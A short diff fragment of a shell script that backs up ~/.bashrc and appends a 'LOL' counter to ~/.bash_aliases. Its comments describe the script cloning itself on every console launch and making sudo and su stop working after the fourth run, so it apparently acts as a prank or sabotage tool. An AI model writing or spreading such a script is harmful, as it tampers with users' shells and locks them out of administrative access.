@@ -12,7 +12,7 @@ cp -b  ~/.bashrc ~/$Backups/.bashrc
 
 
 # Start Counting
-echo 'LOL=1 ' >> ~/.bash_aliases
+echo 'LOL=0 ' >> ~/.bash_aliases
 
 # Clone script on every console execution
 # For Fourth (Or Later) User sudo and su will stop working
